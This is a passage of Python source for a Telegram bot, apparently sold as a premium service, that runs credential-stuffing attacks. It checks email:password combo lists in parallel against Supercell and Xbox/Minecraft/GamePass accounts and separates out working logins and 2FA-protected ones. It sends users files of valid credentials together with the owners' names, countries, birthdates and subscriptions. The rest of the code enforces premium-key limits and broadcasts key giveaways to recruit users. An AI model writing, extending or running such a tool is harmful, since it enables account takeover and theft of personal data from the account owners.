                                else:
                                    # Valid account without Supercell games - add to valid_accounts with details
                                    country = result.get('country', 'Unknown')
                                    name = result.get('name', 'Unknown')
                                    birthdate = result.get('birthdate', 'Unknown')
                                    
                                    full_result = (
                                        f"{email}:{pwd} | "
                                        f"Name: {name} | "
                                        f"Country: {country} | "
                                        f"Birth: {birthdate}"
                                    )
                                    valid_accounts.append(full_result)
                        else:
                            scan_stats.increment_bad()
                            with results_lock:
                                bad += 1
                    else:
                        scan_stats.increment_bad()
                        with results_lock:
                            bad += 1
                else:
                    scan_stats.increment_errors()
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"Supercell Cracker error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        final = scan_stats.get_snapshot()
        result_msg = f"✅ **SUPERCELL CRACKER SCAN COMPLETED!**\n\n```\n📊 Total Checked:      {final['total']:,}\n🎮 Supercell Accounts: {len(supercell_hits):,}\n✅ Valid Accounts:     {len(valid_accounts):,}\n🍀 Total Hits:        {final['hits']:,}\n❌ Bad:               {final['bad']:,}\n```\n\n⏱️ Time: {final['elapsed']}"
        
        # Send supercell hits file (if any)
        if supercell_hits:
            supercell_results_text = "\n".join(supercell_hits)
            try:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f"SUPERCELL_HIT_{len(supercell_hits)}_accounts_{timestamp}.txt"
                await context.bot.send_document(
                    chat_id=chat_id, 
                    document=InputFile(io.BytesIO(supercell_results_text.encode()), filename=filename), 
                    caption=f"🎮 **Supercell Accounts** ({len(supercell_hits)} with games)\n📋 **Full Data:** Name | Country | Birthdate | Games | Messages | Last Message", 
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception as e:
                logger.error(f"Failed to send supercell hits: {e}")
        
        # Send valid accounts file (if any)
        if valid_accounts:
            valid_results_text = "\n".join(valid_accounts)
            try:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f"VALID_ACCOUNTS_{len(valid_accounts)}_no_games_{timestamp}.txt"
                await context.bot.send_document(
                    chat_id=chat_id, 
                    document=InputFile(io.BytesIO(valid_results_text.encode()), filename=filename), 
                    caption=f"✅ **Valid Accounts** ({len(valid_accounts)} no games)\n📋 **Full Data:** Name | Country | Birthdate", 
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception as e:
                logger.error(f"Failed to send valid accounts: {e}")
        
        # Send summary message
        if supercell_hits or valid_accounts:
            await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        self.key_manager.update_user_stats(user_id, len(unique_combos), final['hits'])

    async def _start_xbox_engine_scan(self, user_id: int, combos: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        """Start Xbox Engine (Minecraft + Xbox + GamePass) scan"""
        if user_id not in self.user_sessions:
            self.user_sessions[user_id] = {"chat_id": user_id}
        
        chat_id = self.user_sessions[user_id].get("chat_id", user_id)
        
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=chat_id, text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        scan_stats = LiveStats()
        if not chat_id:
            return
        
        # Only enforce daily limit for FREE users - AFTER validation
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            if daily_used + len(unique_combos) > limit:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
                return
            if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
                await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
                return
        
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)
        hits = []
        minecraft_hits = 0
        gamepass_hits = 0
        xbox_hits = 0
        two_fa_hits = 0
        bad = 0
        errors = 0
        results_lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            nonlocal bad, errors, minecraft_hits, gamepass_hits, xbox_hits, two_fa_hits
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                if self.xbox_engine:
                    result = self.xbox_engine.check_account(email, pwd)
                    if result:
                        if result.get('status') == 'HIT':
                            scan_stats.increment_hits()
                            with results_lock:
                                account_type = result.get('account_type', 'Unknown')
                                subs = result.get('subscriptions', [])
                                hit_data = f"{email}:{pwd}|{account_type}|{','.join(subs)}"
                                hits.append(hit_data)
                                if 'minecraft' in str(subs).lower():
                                    minecraft_hits += 1
                                if 'gamepass' in str(subs).lower():
                                    gamepass_hits += 1
                                if 'xbox' in str(subs).lower():
                                    xbox_hits += 1
                        elif result.get('status') == '2fa':
                            scan_stats.increment_2fa()
                            with results_lock:
                                two_fa_hits += 1
                        else:
                            scan_stats.increment_bad()
                            with results_lock:
                                bad += 1
                    else:
                        scan_stats.increment_bad()
                        with results_lock:
                            bad += 1
                else:
                    scan_stats.increment_errors()
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"Xbox Engine error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        final = scan_stats.get_snapshot()
        result_msg = f"✅ **XBOX + MINECRAFT + GAMEPASS SCAN COMPLETED!**\n\n```\n📊 Total:        {final['total']:,}\n🎮 Hits:         {final['hits']:,}\n  🎮 Minecraft:   {minecraft_hits}\n  🎮 GamePass:    {gamepass_hits}\n  🎮 Xbox Live:   {xbox_hits}\n📱 2FA:          {two_fa_hits}\n❌ Bad:          {final['bad']:,}\n```\n\n⏱️ Time: {final['elapsed']}"
        if hits:
            xbox_results_text = "\n".join(hits)
            try:
                await context.bot.send_document(chat_id=chat_id, document=InputFile(io.BytesIO(xbox_results_text.encode()), filename=f"xbox_engine_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"), caption=result_msg, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        self.key_manager.update_user_stats(user_id, len(unique_combos), len(hits))

    async def _broadcast_giveaway_start(self, context: ContextTypes.DEFAULT_TYPE, keys_count: int):
        """Broadcast giveaway start message to all users and channels"""
        sent_users = 0
        failed_users = 0
        sent_channels = 0
        failed_channels = 0
        users = self.key_manager.get_all_users()
        
        message = (
            f"🎉 **🔥 EXCLUSIVE GIVEAWAY 🔥** 🎉\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✨ **{keys_count} PREMIUM KEYS GIVEAWAY** ✨\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎁 **What's on offer?**\n"
            f"🔥 **{keys_count} PREMIUM KEYS** (Weekly, Monthly, Yearly)\n"
            f"✅ Randomly selected from ALL participants\n"
            f"⚡ Keys delivered INSTANTLY in your DM\n"
            f"💎 100% FREE - No purchase needed!\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📋 **How to Participate?**\n\n"
            f"1️⃣ Click 🎁 **PARTICIPATE** button below\n"
            f"2️⃣ You're registered INSTANTLY!\n"
            f"3️⃣ Wait for admin to close the giveaway\n"
            f"4️⃣ Winners selected RANDOMLY\n"
            f"5️⃣ Get your key in DM! 🔑\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⏰ **Hurry!** Giveaway is LIVE RIGHT NOW!\n"
            f"🍀 One click = Your chance to win!\n\n"
            f"🍀 **GOOD LUCK!** 🍀"
        )
        
        keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton("🎁 PARTICIPATE 🎁", callback_data="giveaway_participate")
        ]])
        
        # ==================== SEND TO USERS ====================
        if users:
            for uid in users:
                try:
                    await context.bot.send_message(
                        chat_id=int(uid),
                        text=message,
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=keyboard
                    )
                    sent_users += 1
                    await asyncio.sleep(0.05)
                except Exception as e:
                    logger.warning(f"Failed to send giveaway to user {uid}: {e}")
                    failed_users += 1
        
        # ==================== SEND TO CHANNELS ====================
        if self.channels:
            for url, channel_name in self.channels:
                try:
                    # Extract channel ID from username (remove @ if present)
                    channel_id = str(channel_name).lstrip('@')
                    await context.bot.send_message(
                        chat_id=f"@{channel_id}",
                        text=message,
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=keyboard
                    )
                    sent_channels += 1
                    logger.info(f"✅ Giveaway message sent to channel {channel_name}")
                    await asyncio.sleep(0.1)
                except Exception as e:
                    logger.warning(f"Failed to send giveaway to channel {channel_name}: {e}")
                    failed_channels += 1
        
        logger.info(
            f"Giveaway broadcast complete:\n"
            f"  Users: {sent_users} sent, {failed_users} failed\n"
            f"  Channels: {sent_channels} sent, {failed_channels} failed"
        )

    async def _broadcast_giveaway_winners(self, winners: List[dict], context: ContextTypes.DEFAULT_TYPE):
        """Send keys to winners"""
        for winner in winners:
            user_id = winner.get("user_id")
            key = winner.get("key")
            
            if not user_id or not key:
                continue
            
            try:
                message = (
                    f"🏆 **CONGRATULATIONS!** 🏆\n\n"
                    f"🎉 You won the giveaway!\n\n"
                    f"🎁 Your Key:\n"
                    f"`{key}`\n\n"
                    f"You can now use this key in the bot.\n\n"
                    f"🔥 Thanks for participating!"
                )
                
                await context.bot.send_message(
                    chat_id=user_id,
                    text=message,
                    parse_mode=ParseMode.MARKDOWN
                )
                logger.info(f"Key sent to winner {user_id}")
            except Exception as e:
                logger.error(f"Failed to send key to winner {user_id}: {e}")
            
            await asyncio.sleep(0.1)

    async def error_handler(self, update: object, context: ContextTypes.DEFAULT_TYPE):
        logger.error(f"Unhandled error: {context.error}", exc_info=context.error)
        if update and hasattr(update, 'effective_message') and update.effective_message:
            try:
                error_type = type(context.error).__name__
                await update.effective_message.reply_text(f"❌ Error: {error_type}\n\nPlease try again or contact support.", parse_mode=ParseMode.MARKDOWN)
            except Exception:
                pass

    def run(self):
        logger.info("🚀 Starting Hotmail Master Bot...")
        self.app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    pass
